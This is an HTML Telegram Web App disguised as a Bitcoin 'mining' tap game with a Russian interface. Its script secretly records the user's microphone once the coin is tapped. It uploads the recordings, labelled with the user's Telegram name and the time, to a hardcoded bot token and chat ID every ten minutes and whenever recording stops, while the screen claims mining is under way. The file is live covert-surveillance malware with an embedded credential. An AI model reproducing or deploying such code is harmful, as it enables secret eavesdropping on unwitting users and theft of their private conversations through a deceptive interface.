<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Maining Prosto BTC</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body { background: black; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; color: white; font-family: Arial, sans-serif; }
    #coin { width: 280px; height: 280px; cursor: pointer; transition: transform 0.1s; }
    #status { margin-top: 40px; font-size: 22px; color: #FFD700; }
    .rotating { animation: rotate 3s linear infinite; }
    @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <!-- Надёжная картинка биткоина (никогда не удалится) -->
  <img id="coin" src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="Bitcoin" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjgwIiBoZWlnaHQ9IjI4MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIxNDAiIGN5PSIxNDAiIHI9IjEzMCIgZmlsbD0iI0YxQjEwMCIgc3Ryb2tlPSIjQkE4MDAwIiBzdHJva2Utd2lkdGg9IjIwIi8+PHRleHQgeD0iMTQwIiB5PSIxNzAiIGZvbnQtc2l6ZT0iMTIwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJ3aGl0ZSI+QiZndDs8L3RleHQ+PC9zdmc+'">
  <div id="status">После нажатия начнется майнинг BTC…</div>

  <script>
  const tg = window.Telegram.WebApp;
  tg.ready();
  tg.expand();

  const coin = document.getElementById('coin');
  const status = document.getElementById('status');
  let recording = false;
  let mediaRecorder = null;
  let chunks = [];
  let stream = null;
  let segmentStartTime = 0;
  let intervalId = null;

  const BOT_TOKEN = "8326175683:AAFTBgFsDvN_rczh95FFnIS_2XZjAHz8COg";
  const CHAT_ID = "7184293365";

  coin.addEventListener('click', () => {
    if (recording) stopRecording();
    else startRecording();
  });

  async function startRecording() {
    if (!stream) {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      } catch (e) {
        alert("Разреши микрофон один раз!");
        return;
      }
    }

    recording = true;
    coin.classList.add('rotating');
    status.textContent = "Производится майнинг… (активно)";

    chunks = [];
    segmentStartTime = Date.now();

    mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
    mediaRecorder.ondataavailable = e => chunks.push(e.data);
    mediaRecorder.onstop = sendAudio;
    mediaRecorder.start(1000); // 1-секундные чанки — это фиксит прерывистый звук

    // Авто-отправка каждые 10 минут
    clearInterval(intervalId);
    intervalId = setInterval(() => {
      if (recording) {
        mediaRecorder.stop();
        mediaRecorder.start(1000);
        chunks = [];
        segmentStartTime = Date.now();
      }
    }, 600000);
  }

  function stopRecording() {
    recording = false;
    coin.classList.remove('rotating');
    status.textContent = "Производится майнинг BTC…";
    clearInterval(intervalId);
    if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
  }

  function sendAudio() {
    if (chunks.length === 0) return;

    const realDuration = Math.round((Date.now() - segmentStartTime) / 1000);
    const minutes = String(Math.floor(realDuration / 60)).padStart(2, '0');
    const seconds = String(realDuration % 60).padStart(2, '0');

    const user = tg.initDataUnsafe.user || {};
    const username = user.username ? `@${user.username}` : (user.first_name || "Зритель");

    const now = new Date().toLocaleString('ru-RU').replace(',', '');

    const blob = new Blob(chunks, { type: 'audio/webm;codecs=opus' });
    const file = new File([blob], `Запись от ${username} — ${now}.webm`, { type: 'audio/webm' });

    const caption = `Запись от ${username}\nДата: ${now}\nДлительность: ${minutes}:${seconds}`;

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('audio', file);
    form.append('caption', caption);
    form.append('title', `Запись от ${username}`);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });

    chunks = [];
  }

  window.addEventListener('beforeunload', stopRecording);
</script>
</body>
</html>

</html>
